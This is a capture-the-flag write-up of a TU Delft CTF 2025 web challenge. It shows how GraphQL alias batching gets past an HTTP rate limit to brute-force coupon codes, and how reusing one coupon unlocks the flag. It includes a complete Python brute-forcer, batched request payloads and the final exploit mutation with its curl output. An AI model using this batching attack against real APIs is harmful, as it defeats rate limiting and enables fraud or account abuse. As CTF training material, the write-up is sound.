# TUDCTF 2025 Pizzano's Domi - Full Writeup (5 solves)

web/Pizzano's Domi

**Author**: Paul Stokreef

**Solver**: Teun van der Ploeg

**Platform**: TU Delft CTF 2025

**Category**: web

**Difficulty**: Medium-Hard


---

![alt text](image.png)

###### fun fact: i always use exactly this picture for embedding exploits. don't know what you can do with this info, maybe also use it at some point in life. look at him, mister cool. -Paul

## 1. Introduction

This challenge revolves around a pizza ordering site with a GraphQL backend. The idea is simple: ordering a special pizza called `FLAG` returns the real capture-the-flag token, as long as the total discounted price stays under 500 euros. The price of the flag pizza is 1337 euros by default, so a sufficiently strong coupon is required.

At first glance, the application rate-limits requests so heavily that brute forcing the coupon space looks impossible. The GraphQL backend contains 200 randomly generated coupons at startup, each five digits long. The code space is 100,000 possibilities. With a rate limit of 20 requests every 30 seconds, guessing the correct coupon appears impossible.

It turns out there is a path inside the working of GraphQL aliasing: batching multiple operations inside a single HTTP request. That one detail enables a fairly clean exploitation path.

This writeup explains the full approach, including backend analysis, rate limit bypass, batch exploitation, and the final coupon stacking path to retrieve the flag.

---

## 2. Overview of the Application Structure

The system consists of:

- A Bun-based frontend server acting as a reverse proxy

- A Rust GraphQL backend implementing the coupon logic

- Docker configuration passing the flag to the GraphQL binary via environment variables

The frontend rate-limits requests to /graphql. The backend contains the actual vulnerability.

---

## 3. The Frontend Proxy and Rate Limiting

The Bun server proxies /graphql to the Rust service running on port 8000. The key section is:

`ts
const RATE_LIMIT_WINDOW_MS = 30_000;
const RATE_LIMIT_MAX = 20;

<SNIP>

    "/graphql": async (req: Request) => {
      const now = Date.now();

      timestamps = timestamps.filter((t) => t > now - RATE_LIMIT_WINDOW_MS);

      if (timestamps.length >= RATE_LIMIT_MAX) {
        const oldest = timestamps[0] ?? now;
        const retryAfterMs = RATE_LIMIT_WINDOW_MS - (now - oldest);
        const retryAfterSec = Math.max(1, Math.ceil(retryAfterMs / 1000));
        return new Response("Too Many Requests", {
          status: 429,
          headers: {
            "Content-Type": "text/plain",
            "Retry-After": String(retryAfterSec),
          },
        });
      }

<SNIP>
`

This enforces at most 20 requests in any 30-second window. But this limit applies only to HTTP requests, not to GraphQL operations inside one request. That is the first observation enabling the bypass.

---

## 4. Backend Coupon Logic

The Rust backend generates 200 coupons at startup:

`rust
static COUPONS: OnceLock<HashMap<String, CouponType>> = OnceLock::new();
`

Each coupon is a 5-digit numeric string. Coupon types include:"

`rust
#[derive(Clone, PartialEq)]
pub enum CouponType {
    None,
    Percentage { discount: f64 },
    NthItem { nth: usize, discount: f64 },
    FlatDiscount { amount: f64 },
    PizzaSpecific { pizza: Pizza, discount: f64 },
    Threshold { minimum: f64, discount: f64 },
    StackingDiscount { tier1: f64, tier2: f64, tier3: f64 },
}
`

And a single special 100% discount coupon.

Internally, the backend applies coupon logic per pizza, then applies flat and threshold coupons at the basket level.
The important part comes from this detail in the order mutation:

`rust
if validation_result.total_discounted_price > 500.0 {
    return Ok(OrderResult {
        success: false,
        message: "Order too expensive! Total must be under €500.00".to_string(),
        flag: None,
    });
}

let has_flag_pizza = input.pizzas.iter().any(|p| *p == Pizza::Flag);

let flag = if has_flag_pizza {
    Some(std::env::var("FLAG").unwrap_or_else(|_| "TUDCTF{fake_flag_for_testing}".to_string()))
} else {
    None
};
`

If the basket total is ≤ 500 and includes the Flag pizza, the challenge flag is returned.

---

## 5. Why Brute Force Looks Impossible

The coupon codes are randomly generated five-digit numbers, so the search space is 100k.

With the enforced rate limit (20 requests per 30 seconds), and each request containing at most a single validateBasket call, brute forcing 100k codes would take nearly seven hours even under ideal conditions.

Given that the challenge likely expects a faster solution, there must be another avenue.

The obvious missing element is GraphQL aliasing.

---

## 6. GraphQL Aliasing as a Bypass

You are allowed to call the same mutation multiple times inside one GraphQL request using aliases:

`graphql
mutation {
  a: validateBasket(input: {...})
  b: validateBasket(input: {...})
  c: validateBasket(input: {...})
}
`

The backend processes each one independently, but Bun only sees this as a single HTTP request. So instead of one coupon test per request, we can perform dozens or hundreds at once.

Each validateBasket allows up to six coupon codes, so a single batched request can test:

`
aliases × 6 codes
`

Using around 50 aliases gives 300 coupons checked per request. At 20 requests per window, that becomes roughly 6000 coupons every 30 seconds.

This immediately reduces the expected brute forcing time for the entire code space from hours to minutes.

---

## 7. Sample Batched Request

Here is a minimal example checking 30 coupon codes (00000–00029) using five aliases:

`http
POST /graphql HTTP/1.1
Host: 9cdc02c2ab20.challs.tudc.tf:30155
Content-Type: application/json

{
  "query": "mutation {
    b0: validateBasket(input: { pizzas: [], couponCodes: [\"00000\",\"00001\",\"00002\",\"00003\",\"00004\",\"00005\"] }) {
      appliedCoupons { code description discountType isValid }
    }
    b1: validateBasket(input: { pizzas: [], couponCodes: [\"00006\",\"00007\",\"00008\",\"00009\",\"00010\",\"00011\"] }) {
      appliedCoupons { code description discountType isValid }
    }
    b2: validateBasket(input: { pizzas: [], couponCodes: [\"00012\",\"00013\",\"00014\",\"00015\",\"00016\",\"00017\"] }) {
      appliedCoupons { code description discountType isValid }
    }
    b3: validateBasket(input: { pizzas: [], couponCodes: [\"00018\",\"00019\",\"00020\",\"00021\",\"00022\",\"00023\"] }) {
      appliedCoupons { code description discountType isValid }
    }
    b4: validateBasket(input: { pizzas: [], couponCodes: [\"00024\",\"00025\",\"00026\",\"00027\",\"00028\",\"00029\"] }) {
      appliedCoupons { code description discountType isValid }
    }
  }"
}
`

Scaling this structure gives access to hundreds of coupon checks per request while remaining inside the rate limit.

## 8. Full Python Brute Forcer

Below is the full brute forcing script that uses GraphQL aliasing to test thousands of codes per minute. It outputs any valid coupons and stops upon finding a strong enough discount.

`python
#!/usr/bin/env python3
import requests
import time
import re
import csv

URL = "http://9cdc02c2ab20.challs.tudc.tf:30155/graphql" # Or input wherever you're running the app. localhost:3000/graphql

CODES_PER_BASKET = 6
BASKETS_PER_REQUEST = 50
RATE_LIMIT_DELAY = 1.6

CSV_FILENAME = "coupons_fast.csv"


def build_query(code_groups):
    parts = ["mutation {"]

    for idx, group in enumerate(code_groups):
        alias = f"b{idx}"
        codes_list = ", ".join(f'"{c}"' for c in group)
        parts.append(
            f"""  {alias}: validateBasket(input: {{
    pizzas: [],
    couponCodes: [{codes_list}]
  }}) {{
    appliedCoupons {{
      code
      description
      discountType
      isValid
    }}
  }}"""
        )

    parts.append("}")
    return "\n".join(parts)


def send_mutation(query):
    payload = {"query": query}

    while True:
        r = requests.post(URL, json=payload)
        if r.status_code == 429:
            retry = r.headers.get("Retry-After", "5")
            time.sleep(int(retry))
            continue
        if r.status_code != 200:
            time.sleep(3)
            continue

        data = r.json()
        if "errors" in data:
            time.sleep(3)
            continue

        return data["data"]


def is_interesting_coupon(c):
    if not c.get("isValid"):
        return False

    dtype = c.get("discountType")
    desc = c.get("description") or ""

    if dtype == "Percentage" and "100" in desc:
        return True

    if dtype == "Threshold":
        m = re.match(r"(\d+)%", desc)
        if m:
            pct = int(m.group(1))
            if pct >= 20:
                return True

    return False


def brute_force(start=0, end=100000):
    with open(CSV_FILENAME, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["code", "type", "description"])

        current = start
        while current < end:
            code_groups = []
            for _ in range(BASKETS_PER_REQUEST):
                if current >= end:
                    break
                group = [f"{i:05d}" for i in range(current, min(current + CODES_PER_BASKET, end))]
                code_groups.append(group)
                current += CODES_PER_BASKET

            query = build_query(code_groups)
            data = send_mutation(query)

            for alias, basket in data.items():
                for c in basket["appliedCoupons"]:
                    if c.get("isValid"):
                        writer.writerow([
                            c.get("code"),
                            c.get("discountType"),
                            c.get("description")
                        ])
                        if is_interesting_coupon(c):
                            return c

            time.sleep(RATE_LIMIT_DELAY)

    return None


if __name__ == "__main__":
    coupon = brute_force()
    print("Found coupon:", coupon)
`

The script finds a Threshold coupon with a sufficiently high discount.

---

## 9. Final Exploit

Once a good coupon has been found, the remaining step is to reuse the same coupon multiple times in an order. The backend does not check whether a coupon is applied more than once.

Here is the mutation that actually produces the flag:

`graphql
mutation Order($input: ValidateBasketInput!) {
  order(input: $input) {
    success
    message
    flag
  }
}
`

Variables:

`json
{
  "input": {
    "pizzas": ["FLAG"],
    "couponCodes": [
      "18493",
      "18493",
      "18493",
      "18493",
      "18493",
      "18493"
    ]
  }
}
`

This brought the total price below the required 500 euro limit, and the backend returned:

`
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://localhost:3000/graphql \
  -H "Content-Type: application/json" \
  --data @exploit.json

{"data":{"order":{"success":true,"message":"Order placed successfully! Total: €237.96","flag":"TUDCTF{redacted}"}}}
`
---

## 10. Closing Remarks

The core problem in this challenge is the interaction between a rate-limited HTTP proxy and an unbounded GraphQL backend. As soon as the system allows multiple GraphQL operations in one HTTP request, the effective brute force rate grows by orders of magnitude. The remaining mistake is permitting a coupon to be applied repeatedly in a single order without further checks.

GraphQL aliasing continues to be an underrated attack surface. This challenge illustrates how even a simple rate-limit can be bypassed outright via batching.

---